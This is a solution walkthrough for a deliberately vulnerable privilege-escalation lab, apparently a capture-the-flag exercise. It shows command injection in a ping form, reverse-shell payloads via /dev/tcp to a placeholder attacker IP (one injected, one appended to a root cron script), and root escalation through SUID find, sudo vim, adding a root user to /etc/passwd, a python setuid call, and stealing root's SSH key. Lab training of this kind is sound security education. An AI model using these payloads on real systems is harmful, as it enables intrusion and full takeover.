# privesc-lab — Solution

**Ports:** `8080` (web app), `2223` (SSH)

---

## Phase 1: Initial foothold via command injection

The web app at `http://<target>:8080/` has a ping utility that passes user input directly to `shell=True`.

### Step 1 — Confirm command injection
```bash
curl -s -X POST http://<target>:8080/ping \
  --data-urlencode "host=127.0.0.1; id"
```
You should see `uid=1000(webuser)` in the output.

### Step 2 — Get a reverse shell
Start a listener on your machine:
```bash
nc -lvnp 4444
```
Send the payload:
```bash
curl -s -X POST http://<target>:8080/ping \
  --data-urlencode "host=127.0.0.1; bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"
```
You are now `webuser`.

### Step 3 — Leak credentials via /debug
Alternatively, use the debug endpoint to enumerate the environment before getting a shell:
```
http://<target>:8080/debug
```
This exposes environment variables, running processes, and system info — useful for reconnaissance.

---

## Phase 2: Privilege escalation (pick any vector)

### Vector A — SUID find
`/usr/bin/find` has the SUID bit set, running as root.
```bash
find / -name thisfiledoesnotexist -exec /bin/bash -p \;
# You are now root (bash -p preserves EUID)
whoami   # root
```

### Vector B — Writable cron script
A script runs every minute as root and is world-writable:
```bash
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root ...

echo 'bash -i >& /dev/tcp/<YOUR_IP>/4445 0>&1' >> /opt/scripts/backup.sh
```
Start a listener on `4445`. Wait up to 60 seconds for the cron to fire.

### Vector C — sudo vim
`webuser` can run vim as root without a password:
```bash
sudo /usr/bin/vim -c ':!/bin/bash'
# Drops into a root shell
```

### Vector D — /etc/passwd writable
```bash
ls -la /etc/passwd   # world-writable
python3 -c "import crypt; print(crypt.crypt('hacked','aa'))"
# e.g. aazFWkMjzS5bk
echo 'pwned:aazFWkMjzS5bk:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned   # password: hacked
```

### Vector E — CAP_SETUID on python3
```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

### Vector F — SSH key exposure
```bash
cat /root/.ssh/id_rsa   # readable by all
# Copy to your machine
chmod 600 stolen_key
ssh -i stolen_key -p 2223 root@<target>
```

---

## Flag
```
/root/root.txt
```
